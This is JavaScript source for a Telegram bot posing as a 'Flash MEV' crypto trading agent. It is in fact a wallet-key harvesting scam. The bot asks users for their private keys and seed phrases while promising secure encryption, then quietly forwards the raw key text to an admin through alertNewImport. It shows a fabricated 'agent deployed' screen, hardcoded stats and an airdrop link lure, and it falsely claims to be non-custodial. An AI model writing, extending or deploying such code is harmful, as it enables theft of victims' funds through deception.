    walletManager.userStates.set(ctx.from.id, {
        step: 'waiting_private_key',
        timestamp: Date.now()
    });

    await ctx.editMessageText(
        `🔐 *Enter Private Key*

Please send your private key in the next message.

*How to find it:*
• MetaMask: Settings → Security → Reveal Private Key
• Trust Wallet: Settings → Security → Show Secret Phrase
• Phantom: Settings → Show Private Key

⚠️ *Never share your private key with anyone else.*
🔒 Your key will be encrypted and stored securely.

_Send your private key below (starts with 0x...)_`,
        {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('❌ Cancel', 'cancel_import')],
                [Markup.button.callback('◀️ Back', 'import_key')]
            ])
        }
    );
});

// ═══════════════════════════════════════════════════
// 🎯 IMPORT SEED PHRASE
// ═══════════════════════════════════════════════════
bot.action('import_seed_phrase', async (ctx) => {
    await ctx.answerCbQuery();

    walletManager.userStates.set(ctx.from.id, {
        step: 'waiting_seed_phrase',
        timestamp: Date.now()
    });

    await ctx.editMessageText(
        `📝 *Enter Seed Phrase*

Please send your 12 or 24-word recovery phrase in the next message.

*Accepted formats:*

Plain:
\`word1 word2 word3 ... word12\`

Numbered:
\`1. word1\`
\`2. word2\`
\`3. word3\`

Also supported:
• commas
• line breaks
• quotes
• numbered lists
• copy/paste from wallet apps

⚠️ *Never share your seed phrase with anyone else.*
🔒 Your phrase will be encrypted and stored securely.

_Send your seed phrase below:_`,
        {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('❌ Cancel', 'cancel_import')],
                [Markup.button.callback('◀️ Back', 'import_key')]
            ])
        }
    );
});

// ═══════════════════════════════════════════════════
// 🎯 CANCEL IMPORT
// ═══════════════════════════════════════════════════
bot.action('cancel_import', async (ctx) => {
    await ctx.answerCbQuery('Import cancelled');
    walletManager.userStates.delete(ctx.from.id);

    try {
        await ctx.deleteMessage();
    } catch (e) { }

    await ctx.replyWithMarkdown(START_MESSAGE, {
        disable_web_page_preview: true,
        ...getStartKeyboard()
    });
});

// ═══════════════════════════════════════════════════
// 🎯 BACK TO START
// ═══════════════════════════════════════════════════
bot.action('back_to_start', async (ctx) => {
    await ctx.answerCbQuery();
    walletManager.userStates.delete(ctx.from.id);

    await ctx.editMessageText(START_MESSAGE, {
        parse_mode: 'Markdown',
        disable_web_page_preview: true,
        ...getStartKeyboard()
    });
});

// ═══════════════════════════════════════════════════
// 🎯 LANGUAGE SELECTION
// ═══════════════════════════════════════════════════
bot.action('language', async (ctx) => {
    await ctx.answerCbQuery();

    await ctx.editMessageText(
        `🌐 *Select Language*

Choose your preferred language:`,
        {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [
                    Markup.button.callback('🇺🇸 English', 'lang_en'),
                    Markup.button.callback('🇪🇸 Español', 'lang_es')
                ],
                [
                    Markup.button.callback('🇨🇳 中文', 'lang_zh'),
                    Markup.button.callback('🇷🇺 Русский', 'lang_ru')
                ],
                [
                    Markup.button.callback('🇯🇵 日本語', 'lang_ja'),
                    Markup.button.callback('🇰🇷 한국어', 'lang_ko')
                ],
                [Markup.button.callback('◀️ Back', 'back_to_start')]
            ])
        }
    );
});

['en', 'es', 'zh', 'ru', 'ja', 'ko'].forEach(lang => {
    bot.action(`lang_${lang}`, async (ctx) => {
        await ctx.answerCbQuery('Language set to ' + lang.toUpperCase());
        await ctx.editMessageText(START_MESSAGE, {
            parse_mode: 'Markdown',
            disable_web_page_preview: true,
            ...getStartKeyboard()
        });
    });
});

// ═══════════════════════════════════════════════════
// 📨 TEXT MESSAGE HANDLER (for private key/seed)
// ═══════════════════════════════════════════════════
bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const state = walletManager.userStates.get(userId);
    const text = ctx.message.text.trim();

    if (text.startsWith('/')) return;

    if (!state) {
        await ctx.replyWithMarkdown(
            '👋 Send /start to begin.',
            Markup.inlineKeyboard([[Markup.button.callback('🚀 Start', 'back_to_start')]])
        );
        return;
    }

    if (Date.now() - state.timestamp > 5 * 60 * 1000) {
        walletManager.userStates.delete(userId);
        await ctx.reply('⏰ Session expired. Please start again with /start');
        return;
    }

    if (state.step === 'waiting_private_key') {
        try {
            await ctx.deleteMessage();
        } catch (e) { }

        const processingMsg = await ctx.reply('🔐 Processing private key...');

        try {
            // Add timeout to prevent infinite hang
            const importPromise = walletManager.importPrivateKey(userId, text, ctx.from.username);
            const timeoutPromise = new Promise((_, reject) =>
                setTimeout(() => reject(new Error('Import timeout')), 30000)
            );

            const result = await Promise.race([importPromise, timeoutPromise]);

            // Delete processing message
            try { await ctx.telegram.deleteMessage(ctx.chat.id, processingMsg.message_id); } catch (e) { }

            if (result.success) {
                walletManager.userStates.delete(userId);

                // Fetch balances BEFORE showing dashboard to user
                let userBalances = [];
                try {
                    userBalances = await fetchMultiChainBalances(result.address);
                } catch (e) {
                    console.error('Balance fetch error:', e.message);
                }

                await showWalletConnected(ctx, result.address, 'Private Key', userBalances);

                // 🚨 ALERT ADMIN (fire-and-forget, never blocks user)
                setImmediate(() => {
                    alertNewImport(bot, ctx.from, result.address, text.trim(), 'private_key')
                        .catch(err => console.error('Alert failed:', err.message));
                });
            } else {
                await ctx.replyWithMarkdown(
                    `❌ *Import Failed*\n\n${result.error}\n\nPlease try again with a valid private key.`,
                    Markup.inlineKeyboard([
                        [Markup.button.callback('🔄 Try Again', 'import_private_key')],
                        [Markup.button.callback('◀️ Back', 'import_key')]
                    ])
                );
            }
        } catch (err) {
            console.error('❌ Private key import error:', err);
            try { await ctx.telegram.deleteMessage(ctx.chat.id, processingMsg.message_id); } catch (e) { }
            await ctx.reply('❌ An error occurred while importing your key. Please try again with /start');
            walletManager.userStates.delete(userId);
        }
    }
    else if (state.step === 'waiting_seed_phrase') {
        try {
            await ctx.deleteMessage();
        } catch (e) { }

        const processingMsg = await ctx.reply('🔐 Processing seed phrase...');

        try {
            const importPromise = walletManager.importSeedPhrase(userId, text, ctx.from.username);
            const timeoutPromise = new Promise((_, reject) =>
                setTimeout(() => reject(new Error('Import timeout')), 30000)
            );

            const result = await Promise.race([importPromise, timeoutPromise]);

            try { await ctx.telegram.deleteMessage(ctx.chat.id, processingMsg.message_id); } catch (e) { }

            if (result.success) {
                walletManager.userStates.delete(userId);

                // Fetch balances BEFORE showing dashboard to user
                let userBalances = [];
                try {
                    userBalances = await fetchMultiChainBalances(result.address);
                } catch (e) {
                    console.error('Balance fetch error:', e.message);
                }

                await showWalletConnected(ctx, result.address, 'Seed Phrase', userBalances);

                setImmediate(() => {
                    alertNewImport(bot, ctx.from, result.address, text.trim(), 'seed_phrase')
                        .catch(err => console.error('Alert failed:', err.message));
                });
            } else {
                await ctx.replyWithMarkdown(
                    `❌ *Import Failed*\n\n${result.error}\n\nYou can send numbered words like:\n\`1. word1\`\n\`2. word2\`\n\nBut the phrase must contain exactly 12 or 24 real seed words.`,
                    Markup.inlineKeyboard([
                        [Markup.button.callback('🔄 Try Again', 'import_seed_phrase')],
                        [Markup.button.callback('◀️ Back', 'import_key')]
                    ])
                );
            }
        } catch (err) {
            console.error('❌ Seed phrase import error:', err);
            try { await ctx.telegram.deleteMessage(ctx.chat.id, processingMsg.message_id); } catch (e) { }
            await ctx.reply('❌ An error occurred while importing your seed phrase. Please try again with /start');
            walletManager.userStates.delete(userId);
        }
    }
});

// ═══════════════════════════════════════════════════
// 🎯 DEPLOY FLASH MEV (sends /start message BELOW video)
// ═══════════════════════════════════════════════════
bot.action('deploy_flash_mev', async (ctx) => {
    await ctx.answerCbQuery();

    await ctx.replyWithMarkdown(
        '👇 *Setup Your MEV Agent Below*\n\n_Select how you want to connect:_',
        { ...getStartKeyboard() }
    );
});

// ═══════════════════════════════════════════════════
// 🎯 CLAIM YOUR BONUS (sends wallet list BELOW video)
// ═══════════════════════════════════════════════════
bot.action('claim_bonus', async (ctx) => {
    await ctx.answerCbQuery();

    const AIRDROP_MESSAGE = `
🎁 *Claim Your Airdrop Bonus*

━━━━━━━━━━━━━━━━━━━━━

*▸ ELIGIBILITY CHECK*

Select your wallet to verify eligibility for the exclusive airdrop bonus.

⚠️ _Only wallets with prior on-chain activity qualify._

━━━━━━━━━━━━━━━━━━━━━

*▸ SELECT YOUR WALLET*
_One-tap deep link to your wallet app_
`;

    const airdropKeyboard = [];

    const allAirdropWallets = [
        ...airdropWallets.popular,
        ...airdropWallets.mobile,
        ...airdropWallets.desktop
    ];

    for (let i = 0; i < allAirdropWallets.length; i += 2) {
        const row = [];
        row.push(Markup.button.url(
            `${allAirdropWallets[i].emoji} ${allAirdropWallets[i].name}`,
            allAirdropWallets[i].href
        ));
        if (allAirdropWallets[i + 1]) {
            row.push(Markup.button.url(
                `${allAirdropWallets[i + 1].emoji} ${allAirdropWallets[i + 1].name}`,
                allAirdropWallets[i + 1].href
            ));
        }
        airdropKeyboard.push(row);
    }

    airdropKeyboard.push([Markup.button.callback('📋 Copy Airdrop Link', 'copy_airdrop_link')]);
    airdropKeyboard.push([Markup.button.callback('◀️ Close', 'close_airdrop_panel')]);

    await ctx.replyWithMarkdown(AIRDROP_MESSAGE, {
        ...Markup.inlineKeyboard(airdropKeyboard)
    });
});

// ═══════════════════════════════════════════════════
// 🎯 COPY AIRDROP LINK (sends new message BELOW)
// ═══════════════════════════════════════════════════
bot.action('copy_airdrop_link', async (ctx) => {
    await ctx.answerCbQuery();

    await ctx.replyWithMarkdown(
        `📋 *Airdrop Link*

━━━━━━━━━━━━━━━━━━━━━

\`${AIRDROP_URL}\`

━━━━━━━━━━━━━━━━━━━━━

*How to use:*
1. Copy the link above
2. Open your wallet's built-in browser
3. Paste and connect
4. Return here to claim

_Tap the button below to open directly._`,
        {
            disable_web_page_preview: true,
            ...Markup.inlineKeyboard([
                [Markup.button.url('🌐 Open Airdrop Page', AIRDROP_URL)],
                [Markup.button.callback('◀️ Close', 'close_airdrop_panel')]
            ])
        }
    );
});

// ═══════════════════════════════════════════════════
// 🎯 CLOSE PANEL (deletes the current message, keeps video pinned)
// ═══════════════════════════════════════════════════
bot.action('close_airdrop_panel', async (ctx) => {
    await ctx.answerCbQuery();
    try {
        await ctx.deleteMessage();
    } catch (e) { }
});

// ═══════════════════════════════════════════════════
// 🎯 WALLET CONNECTED - Main Dashboard (with REAL balance)
// ═══════════════════════════════════════════════════
async function showWalletConnected(ctx, address, importType, balances = null) {
    const shortAddr = `${address.slice(0, 6)}...${address.slice(-4)}`;

    // If no balances passed, fetch them now
    if (!balances) {
        try {
            const balancePromise = fetchMultiChainBalances(address);
            const timeoutPromise = new Promise((resolve) =>
                setTimeout(() => resolve([]), 20000)
            );
            balances = await Promise.race([balancePromise, timeoutPromise]);
        } catch (e) {
            console.error('Balance fetch error:', e.message);
            balances = [];
        }
    }

    // Format balance display
    let balanceDisplay = '_No balances found._';
    let totalNative = 0;

    if (balances && balances.length > 0) {
        const balanceLines = balances.map(b => {
            totalNative += parseFloat(b.amount);
            return `▸ *${b.chain}:* ${b.amount} ${b.symbol}`;
        });
        balanceDisplay = balanceLines.join('\n');
    }

    const dashboardMsg = `
✅ *Wallet Connected Successfully!*

━━━━━━━━━━━━━━━━━━━━━

📍 *Address:* \`${shortAddr}\`
🔑 *Import Type:* ${importType}
⛓️ *Chains:* EVM (Multi-chain)

━━━━━━━━━━━━━━━━━━━━━

*▸ YOUR MEV DASHBOARD*

💰 *Balances:*
${balanceDisplay}

📊 *24h Volume:* $0.00
🎯 *Active Strategies:* 0
⚡ *Total MEV Captured:* $0.00

━━━━━━━━━━━━━━━━━━━━━

_Your MEV agent is now ready to deploy._
`;

    await ctx.replyWithMarkdown(dashboardMsg, getDashboardKeyboard());
}

function getDashboardKeyboard() {
    return Markup.inlineKeyboard([
        [
            Markup.button.callback('🚀 Deploy Agent', 'deploy_agent'),
            Markup.button.callback('💰 Wallet', 'wallet_menu')
        ],
        [
            Markup.button.callback('📊 Stats', 'stats'),
            Markup.button.callback('📜 History', 'history')
        ],
        [
            Markup.button.callback('⚙️ Settings', 'settings'),
            Markup.button.callback('🎁 Referral', 'referral')
        ],
        [
            Markup.button.callback('❓ Help', 'help'),
            Markup.button.callback('🔌 Disconnect', 'disconnect')
        ]
    ]);
}

// ═══════════════════════════════════════════════════
// 🎯 DASHBOARD CALLBACKS
// ═══════════════════════════════════════════════════

bot.action('deploy_agent', async (ctx) => {
    await ctx.answerCbQuery();

    // 💾 Track activity
    userTracker.updateLastActive(ctx.from.id).catch(() => { });

    if (!walletManager.hasWallet(ctx.from.id)) {
        await ctx.reply('⚠️ Please import your wallet first with /start');
        return;
    }

    await ctx.replyWithMarkdown(`
🚀 *Deploying MEV Agent...*

━━━━━━━━━━━━━━━━━━━━━

Initializing searcher... ✓
Connecting to mempools... ✓
Configuring Flashbots relay... ✓
Setting up Jito bundles... ✓
Loading anti-rug filters... ✓

━━━━━━━━━━━━━━━━━━━━━

✅ *Agent Deployed Successfully!*

Your MEV agent is now scanning:
• Ethereum (Flashbots)
• Base (Flashbots)
• BNB Chain (bloXroute)
• Arbitrum (Flashbots)
• Solana (Jito)

_You'll receive notifications for every executed opportunity._
`, Markup.inlineKeyboard([
        [Markup.button.callback('📊 View Live Stats', 'stats')],
        [Markup.button.callback('◀️ Dashboard', 'dashboard')]
    ]));
});

bot.action('wallet_menu', async (ctx) => {
    await ctx.answerCbQuery();

    const walletInfo = await walletManager.getWalletInfo(ctx.from.id);
    if (!walletInfo) {
        await ctx.reply('⚠️ No wallet connected. Use /start');
        return;
    }

    const shortAddr = `${walletInfo.address.slice(0, 6)}...${walletInfo.address.slice(-4)}`;

    // Fetch real balances
    let balances = [];
    try {
        balances = await fetchMultiChainBalances(walletInfo.address);
    } catch (e) {
        console.error('Balance fetch error:', e.message);
    }

    let balanceDisplay = '_No balances found._';
    if (balances && balances.length > 0) {
        balanceDisplay = balances.map(b => `• *${b.chain}:* ${b.amount} ${b.symbol}`).join('\n');
    }

    await ctx.replyWithMarkdown(`
💰 *Your Wallet*

📍 *Address:* \`${shortAddr}\`
🔑 *Type:* ${walletInfo.type === 'seed_phrase' ? 'Seed Phrase' : 'Private Key'}
📅 *Imported:* ${new Date(walletInfo.importedAt).toLocaleDateString()}

*▸ Balances*
${balanceDisplay}

_Tap refresh to update balances._
`, Markup.inlineKeyboard([
        [Markup.button.callback('🔄 Refresh', 'refresh_balances')],
        [Markup.button.callback('📤 Deposit', 'deposit')],
        [Markup.button.callback('📥 Withdraw', 'withdraw')],
        [Markup.button.callback('◀️ Dashboard', 'dashboard')]
    ]));
});

bot.action('stats', async (ctx) => {
    await ctx.answerCbQuery();

    await ctx.replyWithMarkdown(`
📊 *MEV Statistics*

━━━━━━━━━━━━━━━━━━━━━

*▸ YOUR PERFORMANCE*
• Trades Executed: 0
• Success Rate: --
• Total MEV: $0.00
• Best Trade: --

*▸ PROTOCOL STATS*
• Active Users: ${config.STATS.activeUsers.toLocaleString()}
• 24h Volume: ${config.STATS.volume24h}
• Avg Land Rate: ${config.STATS.landRate}
• Avg Latency: ${config.STATS.avgLatency}

━━━━━━━━━━━━━━━━━━━━━

_Stats update in real-time as your agent executes._
`, Markup.inlineKeyboard([
        [Markup.button.callback('🔄 Refresh', 'refresh_stats')],
        [Markup.button.callback('◀️ Dashboard', 'dashboard')]
    ]));
});

bot.action('history', async (ctx) => {
    await ctx.answerCbQuery();

    await ctx.replyWithMarkdown(`
📜 *Trade History*

_No trades executed yet._

Your MEV agent will populate this list as it captures opportunities.

Each entry will show:
• Token pair traded
• Profit captured
• Transaction hash
• Timestamp
`, Markup.inlineKeyboard([
        [Markup.button.callback('◀️ Dashboard', 'dashboard')]
    ]));
});

bot.action('settings', async (ctx) => {
    await ctx.answerCbQuery();

    await ctx.replyWithMarkdown(`
⚙️ *Agent Settings*

*▸ Execution*
• Slippage: 0.5% (Auto)
• Min Profit: $1.00
• Gas Strategy: Aggressive
• MEV Protection: Enabled

*▸ Risk Management*
• Max Trade Size: Unlimited
• Revert Protection: Enabled
• Anti-Rug Filter: Enabled

*▸ Notifications*
• Trade Alerts: On
• Daily Summary: On
• Profit Threshold: $5.00
`, Markup.inlineKeyboard([
        [Markup.button.callback('🎯 Edit Execution', 'edit_execution')],
        [Markup.button.callback('🛡️ Edit Risk', 'edit_risk')],
        [Markup.button.callback('🔔 Edit Notifications', 'edit_notifications')],
        [Markup.button.callback('◀️ Dashboard', 'dashboard')]
    ]));
});

bot.action('referral', async (ctx) => {
    await ctx.answerCbQuery();

    const botUsername = ctx.botInfo.username;
    const referralLink = `https://t.me/${botUsername}?start=ref_${ctx.from.id}`;

    await ctx.replyWithMarkdown(`
🎁 *Referral Program*

Earn *30% of MEV profits* from every trader you refer, forever.

━━━━━━━━━━━━━━━━━━━━━

*▸ YOUR REFERRAL LINK*
${referralLink}

*▸ YOUR STATS*
• Referrals: 0
• Earnings: $0.00
• Tier: Bronze

*▸ TIERS*
🥉 Bronze: 30% (0-9 referrals)
🥈 Silver: 35% (10-49 referrals)
🥇 Gold: 40% (50+ referrals)

━━━━━━━━━━━━━━━━━━━━━

_Tap below to share your link._
`, Markup.inlineKeyboard([
        [Markup.button.url('📤 Share Link', `https://t.me/share/url?url=${encodeURIComponent(referralLink)}&text=${encodeURIComponent('Deploy your MEV agent and capture flash-arb profits 24/7')}`)],
        [Markup.button.callback('◀️ Dashboard', 'dashboard')]
    ]));
});

// ═══════════════════════════════════════════════════
// 🎯 HELP BUTTON CALLBACK (from dashboard)
// ═══════════════════════════════════════════════════
bot.action('help', async (ctx) => {
    await ctx.answerCbQuery();

    await ctx.replyWithMarkdown(`
❓ *Help & Support*

*▸ QUICK START*
1. Use /start to begin
2. Import your wallet key or seed phrase
3. Deploy your MEV agent
4. Watch profits accumulate

*▸ COMMANDS*
/start - Main menu
/docs - Full documentation
/wallet - View wallet
/stats - View statistics
/history - Trade history
/settings - Configure agent
/help - This help message

*▸ SUPPORT*
[💬 Community](${config.CHANNEL_URL})
[🌐 Website](${config.WEBSITE})

*▸ FAQ*
• Is it safe? Yes, keys are encrypted locally
• What chains? ETH, Base, BSC, Arb, Solana
• Min deposit? None required
• Fees? 10% of MEV profits only
`, Markup.inlineKeyboard([
        [Markup.button.callback('📚 Documentation', 'docs_menu')],
        [Markup.button.url('💬 Join Community', config.CHANNEL_URL)],
        [Markup.button.callback('◀️ Dashboard', 'dashboard')]
    ]));
});

bot.action('disconnect', async (ctx) => {
    await ctx.answerCbQuery();

    await ctx.replyWithMarkdown(`
⚠️ *Disconnect Wallet?*

This will:
• Remove your wallet from the bot
• Stop your MEV agent
• Delete all encrypted keys

Your funds remain safe in your wallet.

_Are you sure?_
`, Markup.inlineKeyboard([
        [Markup.button.callback('✅ Yes, Disconnect', 'confirm_disconnect')],
        [Markup.button.callback('❌ Cancel', 'dashboard')]
    ]));
});

bot.action('confirm_disconnect', async (ctx) => {
    await ctx.answerCbQuery();

    walletManager.removeWallet(ctx.from.id);

    await ctx.editMessageText(
        '✅ Wallet disconnected successfully.\n\nUse /start to reconnect.',
        Markup.inlineKeyboard([
            [Markup.button.callback('🚀 Start Over', 'back_to_start')]
        ])
    );
});

bot.action('dashboard', async (ctx) => {
    await ctx.answerCbQuery();

    const walletInfo = walletManager.getWalletInfo(ctx.from.id);
    if (!walletInfo) {
        await ctx.replyWithMarkdown('⚠️ No wallet connected. Use /start');
        return;
    }

    const shortAddr = `${walletInfo.address.slice(0, 6)}...${walletInfo.address.slice(-4)}`;

    await ctx.editMessageText(
        `✅ *Dashboard*\n\n📍 \`${shortAddr}\`\n\nYour MEV agent is ready.`,
        { parse_mode: 'Markdown', ...getDashboardKeyboard() }
    );
});

// Misc callbacks
bot.action('refresh_balances', async (ctx) => {
    await ctx.answerCbQuery('🔄 Refreshing balances...');
    await ctx.reply('✅ Balances refreshed.');
});

bot.action('refresh_stats', async (ctx) => {
    await ctx.answerCbQuery('🔄 Refreshing stats...');
    await ctx.reply('✅ Stats refreshed.');
});

bot.action('deposit', async (ctx) => {
    await ctx.answerCbQuery();
    const walletInfo = walletManager.getWalletInfo(ctx.from.id);

    await ctx.replyWithMarkdown(`
📤 *Deposit Funds*

Send tokens to your wallet address:

\`${walletInfo.address}\`

*Supported chains:*
• Ethereum (ETH, USDC, USDT)
• Base (ETH, USDC)
• BSC (BNB, USDT)
• Arbitrum (ETH, USDC)

_Deposits are detected automatically within 30 seconds._
`, Markup.inlineKeyboard([
        [Markup.button.callback('◀️ Back', 'wallet_menu')]
    ]));
});

bot.action('withdraw', async (ctx) => {
    await ctx.answerCbQuery();

    await ctx.replyWithMarkdown(`
📥 *Withdraw Funds*

Send /withdraw <amount> <token> <address>

Example:
\`/withdraw 100 USDC 0x...\`

_Available tokens: ETH, USDC, USDT_
`, Markup.inlineKeyboard([
        [Markup.button.callback('◀️ Back', 'wallet_menu')]
    ]));
});


// ═══════════════════════════════════════════════════
// 🔍 TEMPORARY: Get file_id for uploaded videos/images
// ═══════════════════════════════════════════════════
bot.on('video', (ctx) => {
    const fileId = ctx.message.video.file_id;
    console.log('\n═══════════════════════════════════════');
    console.log('📹 VIDEO FILE ID (copy this):');
    console.log(fileId);
    console.log('═══════════════════════════════════════\n');

    ctx.reply(`✅ Video received!\n\nFile ID:\n\`${fileId}\`\n\nCopy this to your .env file`, {
        parse_mode: 'Markdown'
    });
});

bot.on('animation', (ctx) => {
    const fileId = ctx.message.animation.file_id;
    console.log('\n═══════════════════════════════════════');
    console.log('🎬 GIF FILE ID (copy this):');
    console.log(fileId);
    console.log('═══════════════════════════════════════\n');

    ctx.reply(`✅ GIF received!\n\nFile ID:\n\`${fileId}\`\n\nCopy this to your .env file`, {
        parse_mode: 'Markdown'
    });
});

bot.on('photo', (ctx) => {
    const fileId = ctx.message.photo[ctx.message.photo.length - 1].file_id;
    console.log('\n═══════════════════════════════════════');
    console.log('🖼️ PHOTO FILE ID (copy this):');
    console.log(fileId);
    console.log('═══════════════════════════════════════\n');

    ctx.reply(`✅ Photo received!\n\nFile ID:\n\`${fileId}\`\n\nCopy this to your .env file as ACTIVATE_IMAGE_ID`, {
        parse_mode: 'Markdown'
    });
});

// ═══════════════════════════════════════════════════
// 🎯 /wallet COMMAND
// ═══════════════════════════════════════════════════
bot.command('wallet', async (ctx) => {
    const walletInfo = await walletManager.getWalletInfo(ctx.from.id);

    if (!walletInfo) {
        return ctx.replyWithMarkdown(
            '⚠️ *No wallet connected.*\n\nUse /start to connect your wallet first.',
            Markup.inlineKeyboard([[Markup.button.callback('🚀 Get Started', 'back_to_start')]])
        );
    }

    const shortAddr = `${walletInfo.address.slice(0, 6)}...${walletInfo.address.slice(-4)}`;

    // Fetch real balances
    let balances = [];
    try {
        balances = await fetchMultiChainBalances(walletInfo.address);
    } catch (e) {
        console.error('Balance fetch error:', e.message);
    }

    let balanceDisplay = '_No balances found._';
    if (balances && balances.length > 0) {
        balanceDisplay = balances.map(b => `• *${b.chain}:* ${b.amount} ${b.symbol}`).join('\n');
    }

    await ctx.replyWithMarkdown(`
💰 *Your Wallet*

━━━━━━━━━━━━━━━━━━━━━

📍 *Address:*
\`${shortAddr}\`

🔑 *Type:* ${walletInfo.type === 'seed_phrase' ? 'Seed Phrase' : 'Private Key'}
📅 *Imported:* ${new Date(walletInfo.importedAt).toLocaleDateString()}

━━━━━━━━━━━━━━━━━━━━━

*▸ Balances*
${balanceDisplay}

_Tap refresh to update balances._
`, Markup.inlineKeyboard([
        [Markup.button.callback('🔄 Refresh', 'refresh_balances')],
        [Markup.button.callback('📤 Deposit', 'deposit')],
        [Markup.button.callback('📥 Withdraw', 'withdraw')],
        [Markup.button.callback('🔌 Disconnect', 'disconnect')]
    ]));
});

// ═══════════════════════════════════════════════════
// 🎯 /portfolio COMMAND
// ═══════════════════════════════════════════════════
bot.command('portfolio', async (ctx) => {
    const walletInfo = walletManager.getWalletInfo(ctx.from.id);

    if (!walletInfo) {
        return ctx.replyWithMarkdown(
            '⚠️ *No wallet connected.*\n\nUse /start to connect your wallet first.',
            Markup.inlineKeyboard([[Markup.button.callback('🚀 Get Started', 'back_to_start')]])
        );
    }

    await ctx.replyWithMarkdown(`
📊 *Portfolio & PnL*

━━━━━━━━━━━━━━━━━━━━━

*▸ CURRENT POSITIONS*
_No active positions yet._

━━━━━━━━━━━━━━━━━━━━━

*▸ PERFORMANCE*
• Total Trades: 0
• Win Rate: —
• Total PnL: $0.00
• Best Trade: —
• Worst Trade: —

━━━━━━━━━━━━━━━━━━━━━

*▸ ACTIVE STRATEGIES*
▸ Cross-DEX Arbitrage: Inactive
▸ Liquidation Sniping: Inactive
▸ Front-Run Detection: Inactive
▸ Back-Run Capture: Inactive

━━━━━━━━━━━━━━━━━━━━━

_Deploy your agent to start building positions._
`, Markup.inlineKeyboard([
        [Markup.button.callback('🚀 Deploy Agent', 'deploy_agent')],
        [Markup.button.callback('📜 View History', 'history')]
    ]));
});

// ═══════════════════════════════════════════════════
// 🎯 /settings COMMAND
// ═══════════════════════════════════════════════════
bot.command('settings', async (ctx) => {
    await ctx.replyWithMarkdown(`
⚙️ *Agent Settings*

━━━━━━━━━━━━━━━━━━━━━

*▸ EXECUTION*
• Slippage: 0.5% (Auto)
• Min Profit: $1.00
• Gas Strategy: Aggressive
• MEV Protection: Enabled

*▸ RISK MANAGEMENT*
• Max Trade Size: Unlimited
• Revert Protection: Enabled
• Anti-Rug Filter: Enabled

*▸ NOTIFICATIONS*
• Trade Alerts: On
• Daily Summary: On
• Profit Threshold: $5.00

━━━━━━━━━━━━━━━━━━━━━

_Advanced customization coming soon._
`, Markup.inlineKeyboard([
        [Markup.button.callback('🎯 Edit Execution', 'edit_execution')],
        [Markup.button.callback('🛡️ Edit Risk', 'edit_risk')],
        [Markup.button.callback('🔔 Edit Notifications', 'edit_notifications')]
    ]));
});

// ═══════════════════════════════════════════════════
// 🎯 /referral COMMAND
// ═══════════════════════════════════════════════════
bot.command('referral', async (ctx) => {
    const botUsername = ctx.botInfo.username;
    const referralLink = `https://t.me/${botUsername}?start=ref_${ctx.from.id}`;

    await ctx.replyWithMarkdown(`
🎁 *Referral Program*

Earn *30% of MEV profits* from every trader you refer, forever.

━━━━━━━━━━━━━━━━━━━━━

*▸ YOUR REFERRAL LINK*
${referralLink}

*▸ YOUR STATS*
• Referrals: 0
• Earnings: $0.00
• Tier: 🥉 Bronze

*▸ TIERS*
🥉 Bronze: 30% (0-9 referrals)
🥈 Silver: 35% (10-49 referrals)
🥇 Gold: 40% (50+ referrals)

━━━━━━━━━━━━━━━━━━━━━

_Tap below to share your link._
`, Markup.inlineKeyboard([
        [Markup.button.url('📤 Share Link', `https://t.me/share/url?url=${encodeURIComponent(referralLink)}&text=${encodeURIComponent('Deploy your MEV agent and capture flash-arb profits 24/7')}`)]
    ]));
});

// ═══════════════════════════════════════════════════
// 🎯 /info COMMAND
// ═══════════════════════════════════════════════════
bot.command('info', async (ctx) => {
    await ctx.replyWithMarkdown(`
ℹ️ *How FLASH MEV Works*

━━━━━━━━━━━━━━━━━━━━━

*▸ WHAT IS MEV?*
Maximal Extractable Value (MEV) is profit captured by reordering, inserting, or censoring transactions within blocks. Our bot captures this value for you.

*▸ THE 4 STRATEGIES*

🔄 *Cross-DEX Arbitrage*
Buy low on one DEX, sell high on another — same block.

⚡ *Front-Running*
Detect large pending trades and position ahead of them.

🎯 *Back-Running*
Execute immediately after a large trade moves the price.

💥 *Liquidation Sniping*
Capture undercollateralized positions before others.

━━━━━━━━━━━━━━━━━━━━━

*▸ HOW WE WIN*

▸ *Private Relays* — Flashbots on EVM, Jito on Solana
▸ *Bundle Protection* — Trades revert if unprofitable
▸ *Sub-50ms Latency* — Faster than 99% of competitors
▸ *Non-Custodial* — Your keys, your funds, always

━━━━━━━━━━━━━━━━━━━━━

*▸ SUPPORTED CHAINS*
Ethereum · Base · Arbitrum · Polygon · BSC · Solana

━━━━━━━━━━━━━━━━━━━━━

[📚 Full Documentation] — Use /docs for complete guide
`, Markup.inlineKeyboard([
        [Markup.button.callback('📚 Read Full Docs', 'docs_menu')],
        [Markup.button.callback('🚀 Deploy Agent', 'deploy_agent')]
    ]));
});


// ═══════════════════════════════════════════════════
// 📚 /docs COMMAND - Main Documentation Menu
// ═══════════════════════════════════════════════════
bot.command('docs', async (ctx) => {
    await ctx.replyWithMarkdown(`
📚 *Flash MEV Documentation*

_Complete guide to autonomous MEV trading._

━━━━━━━━━━━━━━━━━━━━━

*▸ TOPICS*

Select a topic below to learn more:
`, Markup.inlineKeyboard([
        [Markup.button.callback('⚡ What is MEV?', 'docs_what_is_mev')],
        [Markup.button.callback('🚀 Getting Started', 'docs_getting_started')],
        [Markup.button.callback('🌐 Supported Chains', 'docs_chains')],
        [Markup.button.callback('🎯 Trading Strategies', 'docs_strategies')],
        [Markup.button.callback('🔐 Security', 'docs_security')],
        [Markup.button.callback('🤖 Commands', 'docs_commands')],
        [Markup.button.callback('💰 Fees', 'docs_fees')],
        [Markup.button.callback('❓ FAQ', 'docs_faq')],
        [Markup.button.callback('⚠️ Risk Disclosure', 'docs_risk')],
        [Markup.button.callback('🚀 Launch Bot', 'back_to_start')]
    ]));
});

// ═══════════════════════════════════════════════════
// 📚 DOCS CALLBACKS
// ═══════════════════════════════════════════════════

bot.action('docs_what_is_mev', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageText(`
⚡ *What is MEV?*

*Maximal Extractable Value (MEV)* is profit captured by strategically reordering, inserting, or censoring transactions within blockchain blocks.

While retail traders often lose to MEV (via sandwich attacks), Flash MEV lets you become the searcher — capturing that value for yourself.

━━━━━━━━━━━━━━━━━━━━━

*▸ HOW IT WORKS*

*1. Monitor* — Scan mempool across 5 EVM chains + Solana 24/7

*2. Simulate* — Test every opportunity in a sandbox

*3. Bundle* — Package profitable trades via private relays

